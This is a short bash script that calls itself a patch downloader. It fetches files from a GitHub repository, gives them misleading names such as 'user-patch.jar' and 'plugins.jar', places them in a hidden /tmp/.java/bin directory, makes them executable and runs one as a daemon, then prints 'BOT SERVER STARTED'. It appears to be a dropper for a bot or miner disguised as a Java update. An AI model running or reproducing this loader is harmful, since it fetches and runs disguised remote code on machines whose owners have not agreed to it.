#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin &&
        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar &&
        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar &&
        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/fradky/cfg.conf -o cfg.conf &&
        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/fradky/conf.json -o conf.json
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    echo "BOT SERVER STARTED ..."
}

if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/user-patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
